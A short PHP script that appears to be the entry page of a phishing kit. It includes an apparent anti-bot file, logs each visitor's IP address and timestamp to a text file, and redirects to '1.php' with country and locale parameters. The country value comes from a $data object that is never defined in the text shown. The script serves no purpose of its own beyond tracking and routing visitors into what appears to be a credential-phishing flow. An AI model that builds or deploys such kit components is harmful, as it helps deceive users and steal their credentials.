<?php
include './1/ab.php';


$ip = getenv("REMOTE_ADDR");
$file = fopen("../View.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$ip = $_SERVER['REMOTE_ADDR'];
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

header('location:1.php?country.x='.strtoupper($data->countryCode).'&locale.x='.$lang.'_'.strtoupper($lang));

?>